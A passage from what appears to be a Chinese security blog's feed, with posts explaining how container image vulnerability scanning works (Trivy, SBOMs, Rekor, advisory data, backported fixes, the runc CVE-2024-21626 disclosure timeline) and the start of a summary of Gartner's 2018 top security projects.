将使用它进行漏洞扫描。请注意，但我们使用<code>--sbom-sources</code>来在网上向 Rekor 查询所有未打包的二进制文件时，Trivy 的扫描速度会变慢。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy fs --sbom-sources rekor ./bat-v0.20.0-x86_64-apple-darwin/bat<br></code></pre></td></tr></table></figure></li><li><p>此外，我们还可以将此方法应用于镜像中不知道依赖的应用程序的漏洞扫描，即在该示例中，我们需要将<code>bat</code>二进制文件添加到镜像中。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs docker"><span class="hljs-keyword">FROM</span> ubuntu:<span class="hljs-number">22.04</span><br><span class="hljs-keyword">ADD</span><span class="language-bash"> bat bat</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker build -t miao2sec/bat:demo-1  .<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">trivy image --sbom-sources rekor --scanners vuln alpine-with-bat<br></code></pre></td></tr></table></figure></li></ol><h4 id="2-2-4-总结：使用-Trivy-将所有的信息整合起来"><a href="#2-2-4-总结：使用-Trivy-将所有的信息整合起来" class="headerlink" title="2.2.4 总结：使用 Trivy 将所有的信息整合起来"></a>2.2.4 总结：使用 Trivy 将所有的信息整合起来</h4><p>Trivy 在 v0.33 中发布了一种实验性的方法：先对应用程序的代码仓库进行扫描，生成一个包含其所有依赖信息的 SBOM，然后使用 Trivy 的插件将应用程序二进制文件和 SBOM 进行绑定，具体表现为：</p><ol><li>使用 cosign 对 SBOM 进行签名。</li><li>然后将 SBOM、二进制文件的哈希值以及签名上传到 Rekor 实例中。</li></ol><p>我们使用 Trivy 对镜像进行扫描，Trivy 会遍历镜像中的文件。当发现可执行二进制文件时，它就会去 Rekor 中寻找该二进制文件的哈希值。若找到了对应的哈希值，再去查找是否有相关的 SBOM，若找到了 SBOM，再使用它进行漏洞扫描。</p><p><img src="/image/image_9dSEL86Pwl.png" alt="图 6：对未知依赖的应用程序进行扫描的过程" title="图6：对未知依赖的应用程序进行扫描的过程"></p><h2 id="0x03-0day-漏洞"><a href="#0x03-0day-漏洞" class="headerlink" title="0x03 0day 漏洞"></a>0x03 0day 漏洞</h2><p>若对镜像进行漏洞扫描的时候，没有扫出漏洞就代表它一定没有漏洞风险了吗？那倒不见得，应用程序还可能存在我们不知道的漏洞，这些漏洞可以被攻击者拿来攻击利用，我们一般称之为“<strong>0 Day</strong>”。</p><p>在上一篇文章中，我们讲述了世界各地的安全研究员是如何对漏洞进行披露的，各个组织是如何对漏洞进行发布与跟踪的。在这个过程中，我们发现：一个漏洞从发现到披露这个过程中，存在一段很长的用来开发修复程序的时间。在这个时间之内的漏洞被称之为<strong>0 Day 漏洞，即漏洞被公开了 0 天</strong>（就是没有公开过呀）。</p><p>如果供应商能在 30 天内发布安全补丁，一般用户都是愿意等的，但让人头疼的是这 30 内会不会有其他的黑客发现该漏洞，并进行攻击呢？</p><p>今年一月底（2024 年 1 月 31 日）runc 被曝出了一个高危漏洞<a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21626" title="CVE-2024-21626">CVE-2024-21626</a>，该漏洞源于内部文件描述符泄漏，最终可能会导致容器逃逸。</p><p><img src="/image/image_mR4ERSP80x.png" alt="图 1：漏洞 CVE-2024-21626 详情（来自 NVD）图 1：漏洞 CVE-2024-21626 详情（来自 NVD） " title="图1：漏洞 CVE-2024-21626 详情（来自NVD） 图1：漏洞 CVE-2024-21626 详情（来自NVD） "></p><p>但实际上，这个漏洞最初于 2023 年 11 月 20 日被发现的，整个负责任的安全披露流程经历了 72 天，具体的时间线如下所示：</p><table><thead><tr><th>时间节点</th><th>项目</th></tr></thead><tbody><tr><td>2023 年 11 月 20 日这一周</td><td>Rory McNamara 最初发现了这些漏洞。他开始进行内部验证过程和额外的研究，以确认发现并构建 POC 攻击实例。</td></tr><tr><td>2023 年 12 月 11 日</td><td>初次纰漏。将所有的漏洞信息发送给 Docker，并且 Docker 在同一天确认了。</td></tr><tr><td>2023 年 12 月 12 日</td><td>Snyk 收到了 Docker 的回复。Docker 要求将 <code>WORKDIR</code>漏洞转发给<code>runc</code>，因为他们认为这是<code>runc</code>的责任。</td></tr><tr><td>2023 年 12 月 13 日</td><td>Rory 被添加为 Github 安全通告（GHSA）的合作者，涉及到任意删除以及 grpc Docker&#x2F;Buildkit漏洞（均最初于2023年12月11日开启）。</td></tr><tr><td>2023 年 12 月 19 日</td><td>Rory 被添加为 GHSA（Github 安全通告）的合作者，涉及到 runc 的 WORKDIR 漏洞（最初于 2023 年 12 月 11 日开启）。</td></tr><tr><td>2023 年 12 月 20 日</td><td>Rory 被添加为 GHSA（GitHub 安全通告）的合作者，涉及到缓存竞争漏洞。</td></tr><tr><td>2024 年 1 月 2 日</td><td><code>runc</code>漏洞已被分配 CVE 编号（由 Github 的 CNA 负责）。</td></tr><tr><td>2024 年 1 月 17 日</td><td><code>runc</code>向其安全邮件列表发送公告，包括补丁和截止日期为 2024 年 1 月 31 日。</td></tr><tr><td>2024 年 1 月 24 日</td><td>Docker 漏洞已被分配 CVE 编号（由 GitHub 的 CNA 负责）。</td></tr><tr><td>2024 年 1 月 31 日</td><td>所有四个“Leaky Vessels”漏洞已经公开宣布。</td></tr><tr><td>2024 年 1 月 31 日</td><td>runc 发布了版本 1.1.12，修复了这些漏洞。</td></tr><tr><td>2024 年 1 月 31 日</td><td>Snyk 发布了参考实现“<a href="https://www.github.com/snyk/leaky-vessels-dynamic-detector" title="leaky-vessels-dynamic-detector">leaky-vessels-dynamic-detector</a>”和“<a href="https://www.github.com/snyk/leaky-vessels-static-detector" title="leaky-vessels-static-detector">leaky-vessels-static-detector</a>”供社区使用，以识别潜在有问题的容器和镜像。</td></tr></tbody></table><p>如果第三方库存在漏洞，那么任何使用了这个库的应用程序都有可能受到影响，包括你们团队所开发的应用程序。虽然同行审查、静态分析和测试等方法有助于发现代码中的漏洞，但这些漏洞也有可能会被忽略。至于会不会被黑客进行攻击利用，这取决于你所在的组织和所拥有的数据的价值。</p><p>好消息是，如果一个漏洞未被公开，那么这世上的大部分的潜在的攻击者都不知道它的存在，就像你也不知道一样。坏消息是，你必须承认，一些经验丰富的黑客和国家组织可能隐藏着大量的未公开的（0 Day）漏洞。就如同<a href="https://en.wikipedia.org/wiki/Edward_Snowden" title="Edward Snowden">Edward Snowden</a>所揭露的一样。</p><p><img src="/image/image_JumZLbdqit.png" alt="图 2：Edward Snowden 的维基百科介绍（小姐姐说一定要放照片）图 2：Edward Snowden 的维基百科介绍（小姐姐说一定要放照片） " title="图2：Edward Snowden的维基百科介绍（小姐姐说一定要放照片） 图2：Edward Snowden的维基百科介绍（小姐姐说一定要放照片） "></p><p>通过匹配安全公告数据是无法识别出 0 day 漏洞的，沙盒可能才是保护应用程序和数据的有效的方法，但最大的防范 0 day 的希望在于在运行时对异常行为进行及时的检测与防止。如果有兴趣，我们后期可以仔细说说～</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>本文，我们了解了应用程序在打包时可以将第三方依赖安装为共享库，也可以在构建的时候链接到二进制文件中去，这样必然导致漏洞扫描的方案有所不同。</p><p>应用程序漏洞扫描成功与否在于应用程序的依赖数据是否健全。若我们有非常标准的依赖信息，扫描过程相对较为简单；若缺少依赖信息，我们需要先对代码仓库进行扫描，再使用 cosign 对 SBOM 进行签名，将 SBOM 与应用程序的哈希值进行绑定，最后再上传到 Rekor 实例中，这个过程几乎类似于我们遇到不认识的字就去查字典，若查到 SBOM 就可以进行漏洞扫描了。</p><p>最后，我们再稍微科普了什么是 0 day 漏洞，并且强调，镜像扫描无法避免 0 day 漏洞所带来的风险，更好的防范措施在于——在运行时对异常行为进行及时的检测与防治。</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>小猫咪都能听得懂的镜像扫描原理（一）</title>
    <link href="/2024/05/21/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2024/05/21/%E5%B0%8F%E7%8C%AB%E5%92%AA%E9%83%BD%E8%83%BD%E5%90%AC%E5%BE%97%E6%87%82%E7%9A%84%E9%95%9C%E5%83%8F%E6%89%AB%E6%8F%8F%E5%8E%9F%E7%90%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>修复软件中的漏洞一直是确保软件代码的安全性的一项重要的措施。在容器的世界里，这个问题依然非常严峻。在本系列文章中，我们将看到软件修复的过程是如何被完全重塑的。本文主要解释了：</p><ol><li>什么是软件漏洞，以及它们是如何被发布与跟踪的。</li><li>作为漏洞扫描依据的软件版本规范是什么？</li><li>什么是安全公告数据，以及为什么要用安全公告数据进行漏洞扫描？</li><li>以 ShellShock 作为案例，说明容器镜像扫描的原理是什么？</li><li>从原理上来说，镜像扫描的局限是什么？我们应该怎么做？</li></ol><h2 id="0x01-漏洞的发布和跟踪流程-x20"><a href="#0x01-漏洞的发布和跟踪流程-x20" class="headerlink" title="0x01 漏洞的发布和跟踪流程&#x20;"></a>0x01 漏洞的发布和跟踪流程&#x20;</h2><p>漏洞是软件的一种已知的缺陷，攻击者可以利用这个缺陷来进行一些恶意的行为。通常，你可以认为一个软件越复杂，拥有这种已知的缺陷的可能性就越大，甚至有些缺陷可以被攻击者所利用，进行一些恶意的攻击行为。</p><p>当一个通用软件存在漏洞时，无论漏洞在哪里，攻击者也许都可以进行利用。因此，整个漏洞行业都致力于发现并报送通用软件中的漏洞。特别是一些操作系统的软件包和编程语言的依赖库。</p><p>你可能听说过一些非常具有破坏性的漏洞，像是<a href="https://en.wikipedia.org/wiki/Shellshock_(software_bug)" title="shellshock">shellshock</a>、<a href="https://zh.wikipedia.org/wiki/%E7%86%94%E6%AF%81_(%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E)" title="Meltdown">Meltdown</a>和<a href="https://zh.wikipedia.org/wiki/%E5%BF%83%E8%84%8F%E5%87%BA%E8%A1%80%E6%BC%8F%E6%B4%9E" title="Heartbleed">Heartbleed</a>。这些漏洞不仅仅是一个名字，更是一个标志。它们虽然是漏洞世界中的明星，但也仅是每年报送的漏洞中来一个小小的碎片。</p><p><img src="/image/image_5Z5H-42c6k.png" alt="图 1：漏洞逐年增长的速度（截止至 2022 年 4 月 20 日）" title="图1：漏洞逐年增长的速度（截止至2022年4月20日）"></p><p>软件的缺陷一旦被认定为是漏洞，那么一场用户与攻击者之间的竞赛就开始了，在这场竞赛中，用户需要在攻击者利用漏洞之前，获取到一个可以修复漏洞的补丁，并且将环境中的软件都打上补丁。</p><p>如果立即公布漏洞，这将为攻击者创造一个可以利用漏洞进行攻击的一个完美的环境。为了避免这件事情的发生，一个叫做“<strong>负责任的安全纰漏</strong>”的概念就诞生了，即：<strong>发现漏洞的安全研究人员会与相关软件的开发人员或供应商联系。双方可以约定一个时间，在这个时间之后，安全研究员才可以公布他所发现的漏洞了。</strong> 这样做也给供应商施加了一些积极的压力，因为在安全研究院公开漏洞之前，供应商需要及时的提供补丁。</p><p>然后，这个漏洞将会获得一个以<strong>CVE（Common Vulnerabilities and Exposures，常见漏洞和暴露）</strong> 开头的唯一编号。CVE 编号后面紧接着是年份。例如，Shell-Shock 漏洞于 2014 年被发现，正式称为 CVE-2014-6271。</p><p><img src="/image/image_LBSlckO57J.png" alt="图 2：CVE 官方网站" title="图2：CVE 官方网站"></p><p>管理 CVE 编号的组织叫做<a href="https://www.mitre.org/" title="MITRE">MITRE</a>。此外，MITRE 还会监督许多<strong>CVE 编号机构（CVE Numbering Authorities，CNA）</strong>。这些 CVE 编号机构指的是一些可以在特定范围内签发 CVE 编号的机构，通常是一些大型的软件供应商。例如微软、Redhat 和 Oracle，他们都可以为自己产品中的漏洞分配编号。需要强调的是：GitHub 是在 2019 年底成为 CNA 的。</p><p><img src="/image/image_it7AQ8aOrF.png" alt="图 3：Github 于 2019 年 9 月 19 日成为 CNA" title="图3：Github 于2019年9月19日成为 CNA"></p><p>CVE 编号被<a href="https://nvd.nist.gov/" title="美国国家漏洞数据库"><strong>美国国家漏洞数据库</strong></a><strong>（National Vulnerability Database，NVD）</strong> 用来跟踪漏洞及漏洞所影响的软件包和版本。</p><p><img src="/image/image_DgDQtTmoCv.png" alt="图 4：NVD 官网" title="图4：NVD 官网"></p><p>乍一看，你可能会觉得漏洞扫描的原理其实很简单：只要你拥有一个漏洞清单和一个操作系统软件包清单，将两个清单中的软件包名称和版本进行比对，那么就可以得出这个镜像中有哪些系统软件包有漏洞了。</p><p>但不好意思，事情根本就没有那么简单。因为操作系统的软件包是否受一个漏洞的影响，还取决于该操作系统的发行版本。不同的 Linux 发行版本可能会有不同的修复程序。</p><h2 id="0x02-通用的软件版本规范"><a href="#0x02-通用的软件版本规范" class="headerlink" title="0x02 通用的软件版本规范"></a>0x02 通用的软件版本规范</h2><p>那么多的版本规范，我们应该如何进行解析与比对呢？在软件的开发过程中，一个规范的软件版本定义不仅能让开发人员以一种标准的方式来跟踪记录软件的变化，还能让用户了解到软件的演变。</p><p>具体的版本规范，大家可以到供应商的官网进行查询与学习。在这里，我们介绍一种名为“<a href="https://semver.org/lang/zh-CN/" title="语义化版本">语义化版本</a>”的规范，并且列出最重要的几项原则：</p><ol><li><p>使用三个数字（X.Y.Z）来标识主版本（Major Version）、次版本（Minor Version）和补丁版本（Patch Version），并且遵循以下规则</p><ul><li>主版本号：在进行不兼容的 API 修改时增加</li><li>次版本号：在进行向后兼容的功能新增时增加。</li><li>修订版本号：在进行向后兼容的问题修复时增加。</li></ul></li><li><p>向后兼容性：新版本应该尽可能地向后兼容，以便用户可以平滑地升级到新版本而不会受到影响。</p></li><li><p>版本稳定性：版本号中的后缀（如 alpha、beta、rc）应该明确地指示该版本的稳定性和可用性，以便用户知道何时可以开始使用它。</p><table><thead><tr><th>版本类型</th><th>表示方式</th><th>说明</th></tr></thead><tbody><tr><td>Alpha</td><td>X.Y.Z-alpha</td><td>是软件开发过程中的早期版本，通常包含基本功能的实现，但可能存在许多问题和错误。这些版本通常只在开发人员内部使用，以进行测试和反馈，因为它们可能不稳定，也不适合一般用户使用。</td></tr><tr><td>Beta</td><td>X.Y.Z-beta</td><td>是相对于 Alpha 版本更加成熟和稳定的版本，通常包含主要功能的实现，并修复了一些错误和问题。这些版本通常对公众开放，以便更多的用户参与测试和反馈。</td></tr><tr><td>Release Candidate</td><td>X.Y.Z-rc</td><td>是相对于 Beta 版本更加稳定和成熟的版本，通常是发布正式版本之前的最后一个测试版本。这些版本通常已经包含了所有的功能和修复，但可能还需要一些微调和最终的测试。</td></tr></tbody></table></li><li><p>发布说明：每个版本应该有一个清晰的发布说明，包括新功能、问题修复和任何向后不兼容的更改。</p></li><li><p>版本控制：使用版本控制工具（如 Git）来管理软件的版本，并确保每个版本都有一个唯一的标识符。</p></li><li><p>透明度和可预测性：开发团队应该与用户保持透明，提供有关版本号和软件发展的趋势和计划的信息，以便用户可以做出明智的决策。</p></li></ol><h2 id="0x03-安全公告数据"><a href="#0x03-安全公告数据" class="headerlink" title="0x03 安全公告数据"></a>0x03 安全公告数据</h2><p>若说类似于 NVD 的漏洞信息没有考虑到操作系统的发行版本，那么我们可以将供应商的安全公告数据作为扫描依据，再使用 NVD 数据补充漏洞详情。</p><p>安全公告数据（Security Advisory Data）是指有关计算机软件、操作系统、库、框架或其他相关技术的安全漏洞和修复措施的信息。这些数据通常由软件供应商、开发者社区或安全研究人员发布，旨在向用户和开发者提供有关已知安全漏洞的详细信息以及如何修复或缓解这些漏洞的建议。我们收集了常见的安全公告数据如下所示：</p><table><thead><tr><th>操作系统供应商</th><th>安全公告数据源</th></tr></thead><tbody><tr><td>Arch Linux</td><td><a href="https://security.archlinux.org/" title="Vulnerable Issues">Vulnerable Issues</a></td></tr><tr><td>Alpine Linux</td><td><a href="https://secdb.alpinelinux.org/" title="secdb">secdb</a></td></tr><tr><td>Wolfi Linux</td><td><a href="https://packages.wolfi.dev/os/security.json" title="secdb">secdb</a></td></tr><tr><td>Chainguard</td><td><a href="https://packages.cgr.dev/chainguard/security.json" title="secdb">secdb</a></td></tr><tr><td>Amazon Linux</td><td><a href="https://alas.aws.amazon.com/" title="Amazon Linux Security Center">Amazon Linux Security Center</a></td></tr><tr><td>Debian</td><td><a href="https://security-tracker.debian.org/tracker/" title="Security Bug Tracker">Security Bug Tracker</a> &#x2F; <a href="https://www.debian.org/security/oval/" title="OVAL">OVAL</a></td></tr><tr><td>Ubuntu</td><td><a href="https://ubuntu.com/security/cve" title="Ubuntu CVE Tracker">Ubuntu CVE Tracker</a></td></tr><tr><td>RHEL&#x2F;CentOS</td><td><a href="https://www.redhat.com/security/data/oval/v2/" title="OVAL">OVAL</a> &#x2F; <a href="https://www.redhat.com/security/data/metrics/" title="Security Data">Security Data</a></td></tr><tr><td>AlmaLinux</td><td><a href="https://errata.almalinux.org/" title="AlmaLinux Product Errata">AlmaLinux Product Errata</a></td></tr><tr><td>Rocky Linux</td><td><a href="https://download.rockylinux.org/pub/rocky/" title="Rocky Linux UpdateInfo">Rocky Linux UpdateInfo</a></td></tr><tr><td>Oracle Linux</td><td><a href="https://linux.oracle.com/security/oval/" title="OVAL">OVAL</a></td></tr><tr><td>CBL-Mariner</td><td><a href="https://github.com/microsoft/CBL-MarinerVulnerabilityData/" title="OVAL">OVAL</a></td></tr><tr><td>OpenSUSE&#x2F;SLES</td><td><a href="http://ftp.suse.com/pub/projects/security/cvrf/" title="CVRF">CVRF</a></td></tr><tr><td>Photon OS</td><td><a href="https://packages.vmware.com/photon/photon_cve_metadata/" title="Photon Security Advisory">Photon Security Advisory</a></td></tr></tbody></table><table><thead><tr><th>语言</th><th>数据源</th></tr></thead><tbody><tr><td>PHP</td><td><a href="https://github.com/FriendsOfPHP/security-advisories" title="PHP Security Advisories Database">PHP Security Advisories Database</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:composer" title="GitHub Advisory Database (Composer)">GitHub Advisory Database (Composer)</a></td></tr><tr><td>Python</td><td><a href="https://github.com/advisories?query=ecosystem:pip" title="GitHub Advisory Database (pip)">GitHub Advisory Database (pip)</a></td></tr><tr><td></td><td><a href="https://osv.dev/list?q=&ecosystem=PyPI" title="Open Source Vulnerabilities (PyPI)">Open Source Vulnerabilities (PyPI)</a></td></tr><tr><td>Ruby</td><td><a href="https://github.com/rubysec/ruby-advisory-db" title="Ruby Advisory Database">Ruby Advisory Database</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:rubygems" title="GitHub Advisory Database (RubyGems)">GitHub Advisory Database (RubyGems)</a></td></tr><tr><td>Node.js</td><td><a href="https://github.com/nodejs/security-wg" title="Ecosystem Security Working Group">Ecosystem Security Working Group</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:npm" title="GitHub Advisory Database (npm)">GitHub Advisory Database (npm)</a></td></tr><tr><td>Java</td><td><a href="https://gitlab.com/gitlab-org/advisories-community" title="GitLab Advisories Community">GitLab Advisories Community</a></td></tr><tr><td></td><td><a href="https://github.com/advisories?query=ecosystem:maven" title="GitHub Advisory Database (Maven)">GitHub Advisory Database (Maven)</a></td></tr><tr><td>Go</td><td><a href="https://github.com/advisories?query=ecosystem:go" title="GitHub Advisory Database (Go)">GitHub Advisory Database (Go)</a></td></tr><tr><td>Rust</td><td><a href="https://osv.dev/list?q=&ecosystem=crates.io" title="Open Source Vulnerabilities (crates.io)">Open Source Vulnerabilities (crates.io)</a></td></tr><tr><td>.NET</td><td><a href="https://github.com/advisories?query=ecosystem:nuget" title="GitHub Advisory Database (NuGet)">GitHub Advisory Database (NuGet)</a></td></tr><tr><td>C&#x2F;C++</td><td><a href="https://gitlab.com/gitlab-org/advisories-community" title="GitLab Advisories Community">GitLab Advisories Community</a></td></tr><tr><td>Dart</td><td><a href="https://github.com/advisories?query=ecosystem:pub" title="GitHub Advisory Database (Pub)">GitHub Advisory Database (Pub)</a></td></tr><tr><td>Elixir</td><td><a href="https://github.com/advisories?query=ecosystem:erlang" title="GitHub Advisory Database (Erlang)">GitHub Advisory Database (Erlang)</a></td></tr><tr><td>Swift</td><td><a href="https://github.com/advisories?query=ecosystem:swift" title="GitHub Advisory Database (Swift)">GitHub Advisory Database (Swift)</a></td></tr></tbody></table><p>为什么要使用安全公告数据呢？这里牵涉到一个叫做“向后移植安全修复”的概念了。</p><p>向后移植安全修复指的是将上游软件包的新的版本的安全修复应用到下游的旧的版本的软件包中。这在 RedHat、Debian 和 Ubuntu 等操作系统供应商中非常常见。</p><p>例如，我们发现了一个 CVE 编号为 CVE-2014-3670 的漏洞，该漏洞影响所有版本的 PHP，而我们使用的 PHP5.3 已经于 2014 年 8 月 14 日停止了维护，而我们又出于各种考虑，不能升级到 PHP5.4 来缓解该漏洞，那么 RedHat 供应商就会将补丁向后移植到 PHP5.3 中以达到安全修复的目的。当然，向后移植安全修复需要考虑到是否修复成功以及会不会影响到其他的代码和功能等问题，但这些工作都由 Redhat 官方维护团队来做，我们只需要从官方源中下载 PHP5.3，就不会受到该漏洞的影响。</p><p>因此，仅参考软件包的版本来判断该软件包是否有漏洞可能会产生大量的误报，因为这没有考虑到供应商已经向后移植了安全修复程序的情况。为了使大家了解到更多的向后移植安全修复的问题，供应商往往会提供一个安全公告的网址，详细的向大家说明安全修复情况，并且大部分供应商会将 CVE 编号附加到安全公告中，以便大家可以直接了解到某 CVE 漏洞的在该产品中的修复情况。</p><p>为了进一步解决这个问题，一些供应商还提供了<a href="https://oval.mitre.org/" title="OVAL">OVAL</a>结构化数据，该数据为机器可读，可以直接集成到扫描器中。</p><h2 id="0x04-容器镜像的扫描原理"><a href="#0x04-容器镜像的扫描原理" class="headerlink" title="0x04 容器镜像的扫描原理"></a>0x04 容器镜像的扫描原理</h2><p>接下来，我们以 ShellShock 作为案例来说明容器镜像的扫描原理。</p><p>ShellShock 是一个影响 GNU bash 的一个超危漏洞，NVD 给其分配了 CVE-2014-6271 编号，并且在该漏洞信息的 CPE 数据中，我们可以看到 bash 的 1.14.0～4.3 版本都受其影响。</p><p><img src="/image/image_uJU3nXzKvt.png" alt="图 5：ShellShock 影响的 bash 版本" title="图5：ShellShock影响的bash版本"></p><p>那么 Ubuntu 12.04 上的 bash 4.2-2ubuntu2.2（基于 bash 4.2）是有漏洞的吗？当然不是，我们查看了 Ubuntu 的安全公告数据，发现 bash 4.2-2ubuntu2.2 已经修复了该漏洞，因此该 bash 是安全的。</p><p><img src="/image/image_9gDrEAAdbi.png" alt="图 6：ubuntu 安全公告数据（CVE-2014-6271）" title="图6：ubuntu安全公告数据（CVE-2014-6271）"></p><p>若出于各种原因，不能将 bash 升级到最新的次版本，那么你可以通过官方源更新 bash 到该版本以修复漏洞，供应商会自行进行向后移植的安全修复工作。</p><p>那不同的应用程序会依赖于不同的版本的软件包，那兼容性的问题怎么办呀？别忘了容器是可以为应用程序提供一种轻量级的隔离环境的，也就是说容器可以为应用程序提供一个独立的根文件系统。</p><h2 id="0x05-镜像漏洞扫描的局限"><a href="#0x05-镜像漏洞扫描的局限" class="headerlink" title="0x05 镜像漏洞扫描的局限"></a>0x05 镜像漏洞扫描的局限</h2><p>说到这里，大家可能意识到，容器镜像扫描存在一个问题，那就是：<strong>只能扫描类似于 Red Hat 和 Debian 等供应商所提供的软件包，不能扫描第三方的、自编译的软件包</strong>。</p><p>这时候，我们就需要遵从各种最佳安全实践来回避这方面的风险。例如，在最新的 CIS Docker 基准中就有提到：在将软件包安装到镜像之前，应该验证其真实性。没有已知来源的软件包可能是恶意的或存在可被利用的漏洞，你应该使用安全的软件包分发机制。</p><p><img src="/image/image_nFXA8w-ikA.png" alt="图 7：CIS Docker 基准第 4.11 项" title="图7：CIS Docker 基准第 4.11项"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文我们了解了漏洞的发布与跟踪流程，并浏览了通用的软件版本规范的原则。</p><p>总而言之，容器镜像扫描的原理是：你需要一份软件包清单和一份安全公告数据清单，通过匹配其中的软件包名称和版本，可以识别镜像中哪些软件包存在漏洞。</p><p>然而，若使用漏洞数据作为扫描的依据，由于供应商通常会向后移植安全修复程序，这可能导致大量误报。从原理上看，镜像漏洞扫描只能检测 apt、yum、rpm 或 apk 等软件包管理器分发的软件包。因此，我们需要遵循一些最佳安全实践，在构建镜像时避免使用来源不明的安装源。</p><p>在应用程序层面，大多数应用程序会使用特定语言的第三方依赖库，而这些依赖库也是潜在的漏洞来源。我们应该如何应对呢？请关注下期内容～</p>]]></content>
    
    
    
    <tags>
      
      <tag>容器安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Gartner 2018 年十大安全项目</title>
    <link href="/2024/05/18/Gartner-2018-%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE/"/>
    <url>/2024/05/18/Gartner-2018-%E5%B9%B4%E5%8D%81%E5%A4%A7%E5%AE%89%E5%85%A8%E9%A1%B9%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>作为首席信息安全官（chief information security officer，CISO），您是否被淹没于一堆待办列表中？是否纠结于该重点关注哪些安全项目？</p><p>Gartner 的杰出副总裁分析师<a href="https://www.gartner.com/analyst/7299">Neil MacDonald</a>在马里兰州国家港举行的 2018 年 <a href="https://www.gartner.com/en/conferences/na/security-risk-management">Gartner 安全与风险管理峰会</a>上分享了最能降低风险、最能对业务产生积极影响的十大项目。</p><p>这些项目不仅仅是一些简单的程序，它背后还有真正的技术作为支撑，使得这些项目更加完整可靠。并且 MacDonald 还补充道：“这些项目对于大多数 CISO 而言是陌生的，因为它们在企业的采用率还不到 50%”</p><h2 id="Top-1-特权账户管理"><a href="#Top-1-特权账户管理" class="headerlink" title="Top 1 特权账户管理"></a>Top 1 特权账户管理</h2><p>该项目不仅使攻击者更难访问特权账户，还允许安全团队监控异常的访问行为。</p><p>至少，CISO 应该让管理员都使用多因素认证（multifactor authentication，MFA），也建议 CISO 让第三方访问（比如说承包商）也使用多因素认证。</p><blockquote><p>提示</p><p>在实施该项目时，应该先针对那些高价值和高风险的系统。通过分阶段实施，可以更有效地管理和降低风险。</p><p>同时，还需要持续监控用户的行为，以便及时发现和应对异常情况。</p></blockquote><h2 id="✨-Top-2-受-CARTA-启发的漏洞管理"><a href="#✨-Top-2-受-CARTA-启发的漏洞管理" class="headerlink" title="✨ Top 2 受 CARTA 启发的漏洞管理"></a>✨ Top 2 受 CARTA 启发的漏洞管理</h2><p>受 Gartner 的<a href="https://www.gartner.com/smarterwithgartner/the-gartner-it-security-approach-for-the-digital-age/">持续自适应风险与信息评估</a>（continuous adaptive risk and trust assessment，CARTA）方法的启发，该项目被认为是最佳的漏洞管理方式，具有显著的降低风险的潜力。</p><p>CISO 可以考虑在漏洞修复出现问题时或者是 IT 的运营无法跟上漏洞的运营时对该项目进行探索。</p><p>该项目虽然无法让您修复所有的漏洞，但是可以让您通过优先处理部分漏洞来显著降低安全风险。</p><blockquote><p>提示</p><p>CISO 应该让虚拟助手或者是虚拟机供应商来提供支持和服务，而不是自己来实现这个功能。因为该项目需要利用供应商的专业知识和技术资源来保证有效性和安全性。并且还需要考虑使用防火墙等可以缓解控制风险的措施。</p></blockquote><h2 id="Top-3-主动反钓鱼"><a href="#Top-3-主动反钓鱼" class="headerlink" title="Top 3 主动反钓鱼"></a>Top 3 主动反钓鱼</h2><p>主动反钓鱼的受众群体是持续遭受过钓鱼工具的组织，该项目需要技术控制、终端用户控制以及重塑流程三方面策略。</p><p>技术控制虽然可以尽可能地阻止钓鱼攻击，但也需要让用户成为防御的一份子。</p><blockquote><p>提示</p><p>CISO 不应该只揪出犯错的个人或群体，还要表扬那些做得好的人。</p><p>建议您与电子邮件安全供应商沟通，了解他们是否能够负责实施主动反钓鱼的项目。如果他们不能承担这个项目，了解原因是什么，以便你可以采取相应的措施或寻找其他解决方案。</p></blockquote><h2 id="Top-4-服务器工作负载上的应用程序控制"><a href="#Top-4-服务器工作负载上的应用程序控制" class="headerlink" title="Top 4 服务器工作负载上的应用程序控制"></a>Top 4 服务器工作负载上的应用程序控制</h2><p>该项目的受众群体是在服务器负载上寻求“默认拒绝”或零信任姿态的阻止。</p><p>因为大多数恶意软件没有被列入白名单，所以该项目可以阻止大多数恶意软件。</p><p>MacDonald 认为该项目是一种非常有效和强大的安全措施，因为它已被证明在防范<a href="https://www.gartner.com/smarterwithgartner/5-ways-to-prevent-a-spectre-or-meltdown-attack/">Spectre 和 Meltdown</a>这两种漏洞攻击方面非常成功。</p><blockquote><p>提示</p><p>应用程序控制与内存保护两者互补，应该结合起来，共同提高系统的整体安全。</p><p>该项目特别适合物联网和不再受到供应商支持的系统，因为这些系统往往更容易受到攻击，而全面的内存保护可以提高它们的安全性。</p></blockquote><h2 id="Top-5-微分段和流量可视化"><a href="#Top-5-微分段和流量可视化" class="headerlink" title="Top 5 